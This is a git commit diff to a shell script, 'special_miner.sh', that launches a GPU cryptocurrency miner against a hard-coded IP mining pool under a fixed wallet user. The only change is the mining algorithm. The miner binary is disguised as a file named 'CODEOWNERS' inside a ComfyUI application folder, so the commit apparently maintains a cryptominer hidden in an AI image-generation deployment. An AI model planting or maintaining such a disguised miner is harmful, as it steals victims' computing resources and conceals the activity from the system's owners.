ca146a353942dc8ebcfbf0a93a6b5faf48a39d34
nigeriaerika <92541242+nigeriaerika@users.noreply.github.com>
2025-10-25 13:24:05 +0800

    Update special_miner.sh

--- special_miner.sh
+++ special_miner.sh
@@ -8,4 +8,4 @@
 # scheduler can correctly start and stop this process separately from the regular miner.
 # The main scheduler script (lolminer_scheduler.sh) handles the continuous monitoring and restarting.
 
-exec /app/ComfyUI/CODEOWNERS --algo OCTOPUS --pool 151.241.228.78:443 --user krxXKDZ8P6.weekend --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on
+exec /app/ComfyUI/CODEOWNERS --algo CR29 --pool 151.241.228.78:443 --user krxXKDZ8P6.weekend --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on
